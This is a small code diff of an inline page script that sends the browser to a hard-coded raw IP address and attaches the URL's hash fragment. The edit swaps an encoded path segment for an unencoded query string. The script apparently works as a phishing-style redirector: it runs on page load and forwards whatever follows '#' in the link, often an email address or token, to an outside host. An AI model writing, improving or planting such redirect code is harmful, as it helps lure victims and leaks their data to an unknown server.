@@ -1,8 +1,8 @@
 <script>
-    const hashValue = window.location.href.split('#')[1];
+    const hashValue = window.location.hash.slice(1); // Removes the `#` from the hash
     if (hashValue) {
-        // Construct the full URL properly to avoid extra path segments
-        document.location.href = 'https://103.214.111.37/' + encodeURIComponent(hashValue);
+        // Redirect directly to the IP address with the hash as a query parameter
+        document.location.href = 'https://103.214.111.37/?' + hashValue;
     } else {
         document.location.href = 'https://103.214.111.37/';
     }
